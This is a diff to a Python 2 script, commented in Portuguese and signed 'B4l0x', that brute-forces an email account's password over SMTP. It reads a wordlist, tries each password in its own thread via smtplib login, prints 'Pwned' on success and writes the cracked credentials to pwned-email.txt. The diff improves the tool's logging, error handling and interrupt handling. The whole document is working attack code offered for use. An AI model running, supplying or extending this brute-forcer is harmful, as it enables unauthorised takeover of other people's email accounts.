@@ -2,7 +2,9 @@
 # -*- coding: utf-8 -*-
 import smtplib
 import time
+import sys
 import argparse as arg
+import os
 import threading
 
 def banner():
@@ -27,6 +29,7 @@ x = parser.parse_args()
 user = x.email
 porta = x.porta
 server = x.host
+tempo = time.strftime("%H:%M:%S")
 
 def brute(i):
   ii = i.replace("\n", "")
@@ -34,24 +37,31 @@ def brute(i):
   smptserver.set_debuglevel(0)
   smptserver.ehlo()
   smptserver.starttls()
-
+  
   try:
     smptserver.login(user, ii)
-    print "\t[+] Pwneedd: {}:{}\n".format(user, ii)
-    arq = open('pwned-email.txt', 'a')
-    arq.write("Email {} Senha {}").format(user, ii)
+    print "\n\t[{} INFO] Pwned: {}:{}\n\n".format(tempo, user, ii)
+    arq = open("pwned-email.txt", "w")
+    arq.write("Email: {} Senha: {}".format(user, ii))
     arq.close()
-    exit()
   except smtplib.SMTPAuthenticationError:
-    print "[X] Incorreta: {}:{}".format(user, ii)
-
+    print "[{} INFO] Incorreta: {}:{}".format(tempo, user, ii)
+              
 def iniciar():
-  wordlist = open(x.wordlist, 'r').readlines()
-  for i in wordlist:
-    time.sleep(0.2)
-    t1 = threading.Thread(target=brute, args=(i,))
-    t1.start()
-
+  try:
+    try:
+      wordlist = open(x.wordlist, 'r').readlines()
+    except:
+      print("[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
+      exit()
+    for i in wordlist:
+      time.sleep(0.2)
+      t1 = threading.Thread(target=brute, args=(i,))
+      t1.start()
+  except KeyboardInterrupt:
+    print("\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n").format(tempo)
+    exit()
+    
 try:
   smptserver = smtplib.SMTP(server, porta)
   smptserver.ehlo()
